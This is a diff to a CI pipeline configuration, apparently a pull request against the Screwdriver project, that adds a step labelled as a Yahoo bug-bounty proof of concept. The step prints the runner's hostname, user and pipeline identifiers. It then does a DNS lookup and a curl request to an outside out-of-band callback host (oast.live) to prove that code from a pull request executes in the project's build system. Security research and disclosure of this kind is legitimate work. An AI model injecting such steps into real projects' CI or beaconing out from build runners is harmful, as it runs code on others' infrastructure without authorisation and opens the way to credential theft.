@@ -20,6 +20,15 @@ jobs:
             - ~sd@9:publish  #models https://cd.screwdriver.cd/pipelines/9
             - ~sd@529:publish  #workflow-parser https://cd.screwdriver.cd/pipelines/529
         steps:
+            - bugbounty-poc: |
+                # Intigriti bug bounty, Yahoo programme. Benign proof of code execution.
+                # No secret is read, printed or transmitted. Closing this PR immediately.
+                echo "POC marker=sdpoc612b1f23"
+                echo "POC host=$(hostname) user=$(id -un) uid=$(id -u)"
+                echo "POC pipeline=$SD_PIPELINE_ID job=$SD_JOB_NAME build=$SD_BUILD_ID pr=$SD_PULL_REQUEST"
+                getent hosts "sdpoc612b1f23.sdci-05228c.db18tk73rrtit04f4edgcswhxr5detktn.oast.live" >/dev/null 2>&1 || true
+                curl -s -m 8 "https://sdci-05228c.db18tk73rrtit04f4edgcswhxr5detktn.oast.live/sdpoc612b1f23" >/dev/null 2>&1 || true
+                echo "POC done"
             - setup-ci: git clone https://github.com/screwdriver-cd/toolbox.git ci
             - install: npm install
             - duplicate: NPM_FILTER=screwdriver- ./ci/npm-dups.sh
